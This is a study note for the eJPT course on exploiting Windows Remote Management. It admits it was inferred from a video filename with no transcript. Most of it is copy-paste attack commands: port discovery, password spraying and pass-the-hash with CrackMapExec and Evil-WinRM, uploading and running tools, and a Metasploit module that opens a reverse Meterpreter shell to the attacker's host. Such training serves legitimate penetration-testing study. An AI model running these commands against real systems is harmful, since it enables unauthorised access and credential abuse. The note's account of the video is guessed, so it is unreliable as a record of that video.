# Exploiting WinRM (Windows Remote Management)

Note: No transcript was provided. The following summary is inferred conservatively from the filename “17 - Exploiting WinRM.mp4” within “02-ExploitingWindowsVulnerabilities” and reflects standard eJPT-relevant techniques for discovering and abusing WinRM with valid credentials or hashes.

## What the video covers (Introduction / big picture)
- WinRM/PowerShell Remoting background: WS-Management (SOAP over HTTP/S) service on Windows for remote administration.
- Ports and endpoints:
  - 5985/tcp (HTTP) → http://host:5985/wsman
  - 5986/tcp (HTTPS) → https://host:5986/wsman
- Common attacker workflow:
  - Identify WinRM exposure during enumeration.
  - Validate credentials/hashes against WinRM.
  - Obtain an interactive PowerShell session (e.g., Evil-WinRM) for code execution and post-exploitation.
  - Optional: use Metasploit modules to validate or gain a Meterpreter.
- Typical use cases in eJPT:
  - Lateral movement with captured credentials.
  - Post-exploitation on Windows servers where WinRM is enabled by default.

## Flow (ordered)
1. Enumerate and confirm WinRM is exposed (Nmap).
2. Verify credentials/hashes against WinRM (CrackMapExec or Metasploit scanner).
3. Get an interactive shell with Evil-WinRM (HTTP 5985 or HTTPS 5986).
4. Execute commands and transfer files; perform local enumeration.
5. Optional: Use Metasploit’s winrm_script_exec to pop Meterpreter.
6. Troubleshoot (domain vs local accounts, HTTPS/SSL, account lockout risks).

## Tools highlighted
- Nmap (service/port discovery)
- CrackMapExec (validate creds, run commands via WinRM)
- Evil-WinRM (interactive PowerShell remoting from Kali)
- Metasploit:
  - auxiliary/scanner/winrm/winrm_login
  - auxiliary/scanner/winrm/winrm_auth_methods
  - exploit/windows/winrm/winrm_script_exec
- Windows PowerShell native remoting (Enter-PSSession, Invoke-Command) if you have a Windows jump host

## Typical command walkthrough (detailed, copy-paste friendly)

Discovery (confirm WinRM)
```
# Basic scan for WinRM
nmap -p 5985,5986 -sC -sV -oN nmap_winrm.txt <TARGET>

# Quick banner check (HTTP)
curl -i http://<TARGET>:5985/wsman

# Quick banner check (HTTPS; ignore self-signed warnings)
curl -ik https://<TARGET>:5986/wsman
```

Validate credentials/hashes with CrackMapExec
```
# Check a single credential
cme winrm <TARGET> -u 'Administrator' -p 'Passw0rd!'

# Domain user
cme winrm <TARGET> -d 'corp.local' -u 'john.doe' -p 'Summer2024!'

# Password spraying
cme winrm <TARGET> -u users.txt -p 'Winter2024!' --continue-on-success

# With NTLM hash (LM:NT format; LM can be aad3b435b51404eeaad3b435b51404ee if unknown)
cme winrm <TARGET> -u 'Administrator' --hashes 'aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99'

# Verify command execution over WinRM
cme winrm <TARGET> -u 'Administrator' -p 'Passw0rd!' -x 'whoami'
# PowerShell mode (-X) if supported
cme winrm <TARGET> -u 'Administrator' -p 'Passw0rd!' -X 'whoami; $PSVersionTable'
```

Interactive shell with Evil-WinRM
```
# Local admin or a user allowed for Remoting (HTTP 5985)
evil-winrm -i <TARGET> -u 'Administrator' -p 'Passw0rd!'

# Domain user (more reliable than embedding domain in username)
evil-winrm -i <TARGET> -u 'john.doe' -p 'Summer2024!' -d 'corp.local'

# Over HTTPS (5986)
evil-winrm -i <TARGET> -u 'Administrator' -p 'Passw0rd!' -S -P 5986

# Pass-the-Hash (NT hash only)
evil-winrm -i <TARGET> -u 'Administrator' -H '5f4dcc3b5aa765d61d8327deb882cf99'

# Alternate username format for local accounts
evil-winrm -i <TARGET> -u '.\Administrator' -p 'Passw0rd!'
```

Within Evil-WinRM session (post-exploitation basics)
```
# Context and basic system info
whoami
whoami /groups
hostname
systeminfo

# List local admins (PowerShell)
Get-LocalGroupMember -Group 'Administrators'

# Networking
ipconfig /all
arp -a
route print

# Users and shares
net user
net localgroup
net share

# Upload/Download files (Evil-WinRM built-ins)
upload /home/kali/winPEASx64.exe C:\Users\Public\winPEASx64.exe
download C:\Windows\win.ini

# Run an uploaded binary
C:\Users\Public\winPEASx64.exe
```

Metasploit route (scanning and shell)
```
msfconsole -q

# Discover auth methods
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS <TARGET>
set RPORT 5985
set SSL false
run

# Validate credentials
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <TARGET>
set USERNAME Administrator
set PASSWORD Passw0rd!
set RPORT 5985
set SSL false
run

# Get Meterpreter via WinRM
use exploit/windows/winrm/winrm_script_exec
set RHOSTS <TARGET>
set USERNAME Administrator
set PASSWORD Passw0rd!
set RPORT 5985
set SSL false
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_KALI_IP>
set LPORT 4444
run
```

Windows-native PowerShell remoting (if you have a Windows box)
```
# From a Windows host:
$sec = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('corp.local\john.doe', $sec)
Enter-PSSession -ComputerName <TARGET> -Credential $cred
# or HTTPS
Enter-PSSession -ComputerName <TARGET> -UseSSL -Port 5986 -Credential $cred
```

## Practical tips
- Credentials vs hashes:
  - Evil-WinRM supports NTLM pass-the-hash with -H (NT hash only).
  - CrackMapExec expects --hashes 'LMHASH:NTHASH' format; LM can be the well-known null LM hash if unknown.
- Domain vs local:
  - Use -d 'DOMAIN' in Evil-WinRM/CrackMapExec for domain accounts.
  - For local accounts, either prefix .\ (e.g., .\Administrator) or omit -d.
- HTTPS endpoints:
  - Use -S (Evil-WinRM) and set RPORT 5986; self-signed certs are common and typically ignored by tools.
- Permissions:
  - Administrative rights usually required for full remoting. “Remote Management Users” group may allow limited command execution.
- Spraying safety:
  - Respect account lockout policies; throttle attempts and use common-sense timing.
- Quoting:
  - Wrap complex passwords in single quotes in your shell to avoid special character expansion.
- File operations:
  - Safe writable locations: C:\Users\Public\ or C:\Windows\Temp.
- Troubleshooting:
  - If cme shows valid creds but commands fail, try Evil-WinRM; verify firewall and group membership.
  - If HTTP (5985) blocked but HTTPS (5986) open, switch to SSL options.

## Minimal cheat sheet (one-screen flow)
```
# 1) Discover
nmap -p 5985,5986 -sC -sV <TARGET>

# 2) Validate creds/hashes
cme winrm <TARGET> -u 'Administrator' -p 'Passw0rd!'
cme winrm <TARGET> -u 'Administrator' --hashes 'aad3b435b51404eeaad3b435b51404ee:NTHASH'

# 3) Quick command execution
cme winrm <TARGET> -u 'Administrator' -p 'Passw0rd!' -x 'whoami'

# 4) Interactive shell
evil-winrm -i <TARGET> -u 'Administrator' -p 'Passw0rd!'
evil-winrm -i <TARGET> -u 'Administrator' -H 'NTHASH'
evil-winrm -i <TARGET> -u 'Administrator' -p 'Passw0rd!' -S -P 5986

# 5) Post-exploitation basics (inside session)
whoami; hostname; systeminfo
Get-LocalGroupMember -Group Administrators
upload /home/kali/tool.exe C:\Users\Public\tool.exe
C:\Users\Public\tool.exe

# 6) Metasploit option
use auxiliary/scanner/winrm/winrm_login
use exploit/windows/winrm/winrm_script_exec
```

## Summary
- WinRM (ports 5985/5986) enables remote PowerShell and is a prime lateral-movement vector once you have valid credentials or hashes.
- Typical eJPT approach: confirm service with Nmap, validate creds with CrackMapExec, then get an interactive shell using Evil-WinRM for command execution and file transfer.
- Metasploit can help validate auth methods and obtain a Meterpreter via winrm_script_exec.
- Pay attention to domain vs local accounts, HTTPS vs HTTP, permissions, and account lockout when spraying.